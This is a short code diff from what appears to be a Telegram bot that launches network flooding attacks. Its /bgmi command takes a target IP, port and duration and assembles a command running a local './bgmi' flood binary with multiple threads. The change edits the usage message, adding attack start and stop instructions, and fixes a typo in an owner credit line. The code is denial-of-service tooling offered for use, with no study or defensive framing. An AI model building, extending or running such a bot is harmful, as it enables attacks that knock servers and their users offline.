@@ -147,7 +147,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if len(context.args) != 3:
-        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
+        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration> | After attacking, Use /start to start the attack and /stop to stop the attack')
         return
 
     target_ip = context.args[0]
@@ -155,7 +155,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     duration = context.args[2]
 
     flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
-    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.OWMER- @RONIT_IN')
+    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.OWNER- @RONIT_IN')
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
